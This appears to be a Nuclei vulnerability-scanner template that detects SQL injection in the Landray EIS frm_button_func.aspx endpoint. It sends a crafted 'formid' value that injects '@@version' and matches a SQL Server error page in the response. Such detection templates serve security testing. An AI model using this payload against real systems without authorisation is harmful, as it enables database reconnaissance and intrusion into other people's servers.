id: landray-eis-frm-button-func-sqli
info:
  name: Landray EIS frm_button_func SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL Injection vulnerability in Landray EIS frm_button_func endpoint.
http:
  - method: GET
    path:
      - "{{BaseURL}}/frm/frm_button_func.aspx?formid=1%20and%201=@@version--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Microsoft SQL Server"
          - "nvarchar"
          - "Windows"
        part: body
